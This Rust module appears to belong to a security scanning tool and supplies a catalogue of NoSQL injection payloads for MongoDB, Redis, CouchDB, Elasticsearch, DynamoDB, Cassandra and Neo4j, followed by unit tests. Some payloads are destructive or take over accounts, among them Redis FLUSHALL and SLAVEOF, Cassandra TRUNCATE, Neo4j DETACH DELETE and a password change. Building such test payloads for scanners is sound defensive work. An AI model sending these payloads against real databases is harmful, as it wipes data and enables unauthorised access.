use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = payload_vec!(PayloadType::Nosql,
        "mongodb-basic", [
            ("' || '1'=='1", "MongoDB OR injection", Severity::Critical),
            ("' || 1==1", "MongoDB numeric OR", Severity::Critical),
            ("' | 1==1", "MongoDB pipe OR", Severity::Critical),
            ("' || true", "MongoDB true injection", Severity::Critical),
            ("{\"$gt\": \"\"}", "MongoDB $gt operator", Severity::Critical),
            ("{\"$gte\": \"\"}", "MongoDB $gte operator", Severity::Critical),
            ("{\"$lt\": \"\"}", "MongoDB $lt operator", Severity::Critical),
            ("{\"$lte\": \"\"}", "MongoDB $lte operator", Severity::Critical),
            ("{\"$ne\": \"\"}", "MongoDB $ne operator", Severity::Critical),
            ("{\"$in\": [\"admin\", \"user\"]}", "MongoDB $in operator", Severity::Critical),
            ("{\"$nin\": [\"admin\"]}", "MongoDB $nin operator", Severity::Critical),
            ("{\"$or\": [{\"x\": \"a\"}, {\"y\": \"b\"}]}", "MongoDB $or clause", Severity::Critical),
            ("{\"$and\": [{\"x\": \"a\"}, {\"y\": \"b\"}]}", "MongoDB $and clause", Severity::Critical),
            ("{\"$where\": \"1==1\"}", "MongoDB $where injection", Severity::Critical),
            ("{\"$where\": \"sleep(5000)\"}", "MongoDB $where sleep", Severity::Critical),
            ("{\"$regex\": \".*\"}", "MongoDB $regex wildcard", Severity::High),
            ("{\"$regex\": \"^admin\"}", "MongoDB $regex anchor", Severity::High),
            ("{\"$exists\": true}", "MongoDB $exists true", Severity::Medium),
            ("{\"$exists\": false}", "MongoDB $exists false", Severity::Medium),
            ("{\"$type\": \"string\"}", "MongoDB $type string", Severity::Medium),
            ("{\"$type\": \"null\"}", "MongoDB $type null", Severity::Medium),
            ("{\"$size\": 0}", "MongoDB $size zero", Severity::Medium),
        ];
        "mongodb-extraction", [
            ("{\"$gt\": \"\", \"username\": {\"$regex\": \".*\"}}", "MongoDB username enum via $gt", Severity::Critical),
            ("{\"$regex\": \"^a\", \"username\": {\"$ne\": \"abc\"}}", "MongoDB username prefix enum", Severity::Critical),
            ("{\"$where\": \"Object.keys(db.getCollectionNames())[0]\"}", "MongoDB list collections via $where", Severity::Critical),
            ("{\"$jsonSchema\": {\"required\": []}}", "MongoDB $jsonSchema probe", Severity::High),
            ("1==1", "MongoDB raw expression", Severity::Critical),
        ];
        "redis", [
            ("*3\\r\\n$3\\r\\nGET\\r\\n$4\\r\\ntest\\r\\n", "Redis GET command", Severity::Critical),
            ("*1\\r\\n$4\\r\\nKEYS\\r\\n$1\\r\\n*\\r\\n", "Redis KEYS pattern", Severity::Critical),
            ("*1\\r\\n$4\\r\\nDBSIZE\\r\\n", "Redis DBSIZE", Severity::High),
            ("*1\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nGET\\r\\n$3\\r\\ndir\\r\\n", "Redis CONFIG dir", Severity::Critical),
            ("*1\\r\\n$8\\r\\nFLUSHALL\\r\\n", "Redis FLUSHALL", Severity::Critical),
            ("*2\\r\\n$6\\r\\nSELECT\\r\\n$1\\r\\n0\\r\\n", "Redis SELECT db", Severity::High),
            ("*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$10\\r\\ndir\\r\\n$5\\r\\n/tmp\\r\\n", "Redis CONFIG SET dir", Severity::Critical),
            ("*3\\r\\n$6\\r\\nSLAVEOF\\r\\n$9\\r\\n127.0.0.1\\r\\n$4\\r\\n6379\\r\\n", "Redis SLAVEOF redirect", Severity::Critical),
            ("*3\\r\\n$6\\r\\nMODULE\\r\\n$6\\r\\nUNLIST\\r\\n", "Redis MODULE UNLIST", Severity::Critical),
            ("*3\\r\\n$7\\r\\nREPLICA\\r\\n$9\\r\\n127.0.0.1\\r\\n$4\\r\\n6379\\r\\n", "Redis REPLICAOF redirect", Severity::Critical),
        ];
        "couchdb", [
            ("_design/test", "CouchDB design doc access", Severity::High),
            ("_session", "CouchDB session endpoint", Severity::High),
            ("_all_dbs", "CouchDB list all databases", Severity::High),
            ("/_users/_all_docs", "CouchDB list all users", Severity::Critical),
            ("/_replicator/_all_docs", "CouchDB list replicators", Severity::High),
        ];
        "elasticsearch", [
            ("_cluster/health", "Elasticsearch cluster health", Severity::High),
            ("_cat/indices", "Elasticsearch list indices", Severity::High),
            ("_nodes/stats", "Elasticsearch node stats", Severity::High),
            ("_search?q=*", "Elasticsearch search all", Severity::High),
            ("_cat/shards", "Elasticsearch list shards", Severity::High),
        ];
        "bypass", [
            ("%00", "Null byte injection", Severity::High),
            ("%27%20OR%20%271%27%3D%271", "URL encoded quote bypass", Severity::High),
            ("%7B%22%24gt%22%3A%20%22%22%7D", "URL encoded $gt operator", Severity::High),
            (";return true;", "JavaScript return bypass", Severity::Critical),
            ("'===' || '1'==='1", "JavaScript triple equals bypass", Severity::Critical),
            ("1; while(1){}", "Infinite loop payload", Severity::High),
        ];
        "dynamodb", [
            ("{\"ExpressionAttributeValues\":{\":v\":true},\"FilterExpression\":\"admin = :v\"}", "DynamoDB attribute filter", Severity::Critical),
            ("{\"KeyConditionExpression\":\"id = :v\",\"ExpressionAttributeValues\":{\":v\":\"1\"}}", "DynamoDB key condition", Severity::Critical),
            ("{\"ProjectionExpression\":\"*\",\"TableName\":\"users\"}", "DynamoDB full table scan", Severity::High),
            ("{\"ScanIndexForward\":false,\"Limit\":100,\"TableName\":\"users\"}", "DynamoDB scan", Severity::High),
            ("{\"UpdateExpression\":\"SET #a = :v\",\"ExpressionAttributeNames\":{\"#a\":\"admin\"},\"ExpressionAttributeValues\":{\":v\":true}}", "DynamoDB update injection", Severity::Critical),
        ];
        "cassandra", [
            ("SELECT * FROM users WHERE username='admin' ALLOW FILTERING", "Cassandra ALLOW FILTERING", Severity::High),
            ("TRUNCATE users", "Cassandra TRUNCATE", Severity::Critical),
            ("CREATE TABLE evil (id int PRIMARY KEY, data text)", "Cassandra table creation", Severity::Critical),
            ("SELECT * FROM system_schema.tables", "Cassandra schema enumeration", Severity::High),
        ];
        "neo4j", [
            ("MATCH (n) RETURN n LIMIT 100", "Neo4j full node dump", Severity::High),
            ("MATCH (n) DETACH DELETE n", "Neo4j delete all nodes", Severity::Critical),
            ("MATCH (u:User {name:'admin'}) RETURN u", "Neo4j user lookup", Severity::High),
            ("CALL dbms.security.changePassword('hacked')", "Neo4j password change", Severity::Critical),
        ];
        "mongodb-agg", [
            ("{\"$expr\":{\"$gt\":[{\"$strLenCP\":\"$password\"},0]}}", "MongoDB $expr injection", Severity::Critical),
            ("{\"$function\":{\"body\":\"function(){return db.getCollectionNames()}\",\"args\":[],\"lang\":\"js\"}}", "MongoDB $function", Severity::Critical),
            ("{\"$accumulator\":{\"init\":\"function(){return 0}\",\"accumulate\":\"function(state,v){return state+1}\",\"accumulateArgs\":[\"$value\"],\"merge\":\"function(s1,s2){return s1+s2}\",\"lang\":\"js\"}}", "MongoDB $accumulator", Severity::Critical),
        ];
    );

    for p in &mut payloads {
        if !p.tags.contains(&"mongodb".to_string())
            && !p.tags.contains(&"nosql".to_string())
            && (p.payload.contains("redis")
                || p.payload.contains("couch")
                || p.payload.contains("elastic"))
        {
            p.tags.push("nosql".to_string());
        }
    }

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "NoSQL payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_nosql_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Nosql);
        }
    }

    #[test]
    fn contains_mongodb_operators() {
        let payloads = get_payloads();
        let has_gt = payloads.iter().any(|p| p.payload.contains("$gt"));
        let has_or = payloads.iter().any(|p| p.payload.contains("$or"));
        let has_where = payloads.iter().any(|p| p.payload.contains("$where"));
        assert!(has_gt, "Must contain $gt operator");
        assert!(has_or, "Must contain $or operator");
        assert!(has_where, "Must contain $where operator");
    }

    #[test]
    fn contains_redis_commands() {
        let payloads = get_payloads();
        let has_redis = payloads.iter().any(|p| {
            p.payload.contains("GET")
                || p.payload.contains("KEYS")
                || p.payload.contains("FLUSHALL")
        });
        assert!(has_redis, "Must contain Redis commands");
    }

    #[test]
    fn contains_or_injection() {
        let payloads = get_payloads();
        let has_or = payloads
            .iter()
            .any(|p| p.payload.contains("||") || p.payload.contains("OR"));
        assert!(has_or, "Must contain OR-based injection");
    }

    #[test]
    fn contains_blind_injection() {
        let payloads = get_payloads();
        let has_sleep = payloads.iter().any(|p| p.payload.contains("sleep"));
        assert!(has_sleep, "Must contain time-based blind injection (sleep)");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 55,
            "Must have substantial NoSQL payload coverage, got {}",
            payloads.len()
        );
    }
}
